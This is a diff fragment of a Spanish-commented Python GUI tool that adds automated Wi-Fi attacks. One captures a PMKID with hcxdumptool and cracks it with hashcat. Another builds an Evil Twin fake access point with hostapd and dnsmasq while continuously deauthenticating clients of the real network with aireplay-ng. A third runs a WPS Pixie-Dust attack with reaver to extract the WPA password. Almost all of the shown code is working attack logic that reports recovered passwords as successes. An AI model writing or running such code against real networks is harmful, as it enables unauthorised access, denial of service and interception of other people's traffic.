-        """Reactiva los botones de la GUI cuando el ataque termina."""
-        self.start_button.config(state=tk.NORMAL)
-        self.stop_button.config(state=tk.DISABLED)
-        self.scan_button.config(state=tk.NORMAL)
-        self.attack_start_time = None # Reset timer
-        if "ÉXITO" not in self.attack_status.get() and "Error" not in self.attack_status.get() and "detenido" not in self.attack_status.get():
-            self.update_attack_status("Inactivo")
+    # <--- NUEVO: Secuencia de ataque PMKID completa
+    def run_pmkid_attack_sequence(self):
+        bssid = self.pmkid_bssid.get()
+        wordlist = self.pmkid_wordlist.get()
 
-
-    def on_closing(self):
-        """Maneja el cierre de la ventana, asegurándose de que todo se detenga."""
-        if self.attack_thread and self.attack_thread.is_alive():
-            self.stop_event.set()
-            self.attack_thread.join(timeout=5) # Esperar al hilo
+        self.update_attack_status("Activando modo monitor (PMKID)...")
+        self.monitor_interface = set_monitor_mode(self.base_interface, self.log_queue)
+        if not self.monitor_interface or self.stop_event.is_set():
+            self.attack_finished()
+            return
         
-        if self.interface:
-            # Intento final de limpiar
-            stop_monitor_mode(self.interface, self.log_queue)
+        pmkid_cap = "/tmp/pmkid_capture.pcapng"
+        pmkid_hash = "/tmp/pmkid_hash.22000"
+
+        try:
+            self.log_queue.put("\n--- FASE 1: Capturando PMKID ---")
+            self.update_attack_status("Buscando PMKID...")
             
-        self.root.destroy()
+            hcx_cmd = ['hcxdumptool', '-i', self.monitor_interface, '-o', pmkid_cap, '--enable_status=1', f'--bssid={bssid}']
+            hcx_proc = subprocess.Popen(hcx_cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
+            self.active_processes.append(hcx_proc)
+            
+            pmkid_found = False
+            timeout = time.time() + 45 # Intentar por 45 segundos
+            while not pmkid_found and not self.stop_event.is_set() and time.time() < timeout:
+                line = hcx_proc.stdout.readline()
+                if not line: break
+                self.log_queue.put(line.strip())
+                if "FOUND PMKID" in line.upper():
+                    self.log_queue.put("\n[+] ¡PMKID CAPTURADO!\n")
+                    pmkid_found = True
+                time.sleep(0.1)
+            
+            hcx_proc.terminate()
+            self.active_processes.clear()
+
+            if pmkid_found and not self.stop_event.is_set():
+                self.log_queue.put("[*] Convirtiendo captura a formato hashcat...")
+                subprocess.run(['hcxhashtool', '-i', pmkid_cap, '-o', pmkid_hash], capture_output=True)
+                
+                if os.path.exists(pmkid_hash) and os.path.getsize(pmkid_hash) > 0:
+                    self.log_queue.put("\n--- FASE 2: Crackeando PMKID con Hashcat ---")
+                    self.update_attack_status("Crackeando PMKID...")
+
+                    hashcat_cmd = ['hashcat', '-m', '22000', pmkid_hash, wordlist, '--force']
+                    hashcat_proc = subprocess.Popen(hashcat_cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
+                    self.active_processes.append(hashcat_proc)
+
+                    while not self.stop_event.is_set():
+                        line = hashcat_proc.stdout.readline()
+                        if not line: break
+                        self.log_queue.put(line.strip())
+                        if "Cracked" in line: break # Hashcat indica que terminó
+                    
+                    hashcat_proc.terminate()
+                    self.active_processes.clear()
+                    
+                    # Comprobar resultado
+                    show_cmd = ['hashcat', '-m', '22000', pmkid_hash, '--show']
+                    result = subprocess.run(show_cmd, capture_output=True, text=True)
+                    if ":" in result.stdout:
+                        password = result.stdout.split(':')[-1].strip()
+                        self.log_queue.put(f"\n[*****] ¡ÉXITO! Contraseña: {password} [*****]\n")
+                        self.update_attack_status(f"ÉXITO: {password}")
+                    else:
+                        self.log_queue.put("[!] Contraseña no encontrada en el diccionario.")
+                        self.update_attack_status("Contraseña no encontrada")
+                else:
+                    self.log_queue.put("[!] No se pudo extraer un hash válido del PMKID.")
+                    self.update_attack_status("Fallo al extraer hash")
+            elif not self.stop_event.is_set():
+                self.log_queue.put("[!] No se pudo capturar PMKID en el tiempo establecido.")
+                self.update_attack_status("Fallo al capturar PMKID")
+
+        finally:
+            stop_monitor_mode(self.monitor_interface, self.log_queue)
+            self.attack_finished()
+            self.monitor_interface = None
+
+    # <--- NUEVO: Secuencia de ataque Evil Twin
+    def run_evil_twin_sequence(self):
+        essid = self.et_essid.get()
+        bssid = self.et_bssid.get()
+        channel = self.et_channel.get()
+        
+        self.update_attack_status("Configurando Evil Twin...")
+        self.monitor_interface = set_monitor_mode(self.base_interface, self.log_queue)
+        if not self.monitor_interface or self.stop_event.is_set():
+            self.attack_finished()
+            return
+            
+        hostapd_conf = create_hostapd_conf(self.monitor_interface, essid, channel)
+        dnsmasq_conf = create_dnsmasq_conf(self.monitor_interface)
+
+        try:
+            self.log_queue.put("\n--- Iniciando Ataque Evil Twin ---")
+            
+            # 1. Configurar IP de la interfaz
+            self.log_queue.put(f"[*] Configurando IP 10.0.0.1 para {self.monitor_interface}")
+            subprocess.run(['ifconfig', self.monitor_interface, '10.0.0.1', 'netmask', '255.255.255.0'], check=True)
+            
+            # 2. Iniciar dnsmasq
+            self.log_queue.put("[*] Iniciando servidor DHCP/DNS (dnsmasq)...")
+            dnsmasq_proc = subprocess.Popen(['dnsmasq', '-C', dnsmasq_conf, '-d'], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
+            self.active_processes.append(dnsmasq_proc)
+            
+            # 3. Iniciar hostapd
+            self.log_queue.put("[*] Iniciando punto de acceso falso (hostapd)...")
+            hostapd_proc = subprocess.Popen(['hostapd', hostapd_conf], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
+            self.active_processes.append(hostapd_proc)
+            time.sleep(5) # Dar tiempo a que los servicios inicien
+
+            # 4. Iniciar desautenticación en el AP original
+            self.log_queue.put(f"[*] Desautenticando clientes del AP original ({bssid})...")
+            deauth_proc = subprocess.Popen(['aireplay-ng', '--deauth', '0', '-a', bssid, self.monitor_interface], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+            self.active_processes.append(deauth_proc)
+
+            self.update_attack_status("Evil Twin Activo. Escuchando...")
+            self.log_queue.put("[+] ¡Evil Twin está operativo! Monitorea la salida de dnsmasq para ver conexiones.")
+            
+            # Monitorear la salida de dnsmasq para ver actividad
+            while not self.stop_event.is_set():
+                line = dnsmasq_proc.stdout.readline()
+                if not line: break
+                self.log_queue.put(f"[DNSMASQ] {line.strip()}")
+            
+        except Exception as e:
+            self.log_queue.put(f"[!!!] Error crítico durante el Evil Twin: {e}")
+            self.update_attack_status("Error en Evil Twin")
+        finally:
+            self.log_queue.put("[*] Limpiando procesos de Evil Twin...")
+            for proc in self.active_processes:
+                proc.terminate()
+            self.active_processes.clear()
+            
+            # Limpiar reglas de IP y restaurar interfaz
+            subprocess.run(['ip', 'addr', 'flush', 'dev', self.monitor_interface], capture_output=True)
+            stop_monitor_mode(self.monitor_interface, self.log_queue)
+            self.attack_finished()
+            self.monitor_interface = None
+
+    # <--- NUEVO: Secuencia de ataque WPS Pixie-Dust
+    def run_wps_attack_sequence(self):
+        bssid = self.wps_bssid.get()
+        item = self.tree.item(self.tree.focus())
+        channel = item['values'][1]
+
+        self.update_attack_status("Activando modo monitor (WPS)...")
+        self.monitor_interface = set_monitor_mode(self.base_interface, self.log_queue)
+        if not self.monitor_interface or self.stop_event.is_set():
+            self.attack_finished()
+            return
+        
+        try:
+            self.log_queue.put("\n--- Iniciando Ataque WPS Pixie-Dust ---")
+            self.update_attack_status("Atacando WPS con Reaver...")
+            
+            # Comando de Reaver para Pixie-Dust (-K 1)
+            reaver_cmd = ['reaver', '-i', self.monitor_interface, '-b', bssid, '-c', channel, '-vvv', '-K', '1', '-N']
+            reaver_proc = subprocess.Popen(reaver_cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
+            self.active_processes.append(reaver_proc)
+            
+            found_key = None
+            while not self.stop_event.is_set():
+                line = reaver_proc.stdout.readline()
+                if not line: break
+                self.log_queue.put(line.strip())
+                
+                # Buscar el PIN y la clave
+                if "WPS PIN:" in line:
+                    pin = line.split(':')[-1].strip()
+                    self.log_queue.put(f"\n[+] PIN WPS encontrado: {pin}\n")
+                if "WPA PSK:" in line:
+                    found_key = line.split(':')[-1].strip().strip("'")
+                    self.log_queue.put(f"\n[*****] ¡ÉXITO! Contraseña WPA: {found_key} [*****]\n")
+                    self.update_attack_status(f"ÉXITO: {found_key}")
+                    break
+            
+            reaver_proc.terminate()
+            self.active_processes.clear()
+            
+            if not found_key and not self.stop_event.is_set():
+                self.log_queue.put("[!] El ataque WPS no tuvo éxito. La red puede no ser vulnerable a Pixie-Dust.")
+                self.update_attack_status("Ataque WPS fallido")
+                
+        finally:
+            stop_monitor_mode(self.monitor_interface, self.log_queue)
+            self.attack_finished()
+            self.monitor_interface = None
 
 
 if __name__ == "__main__":
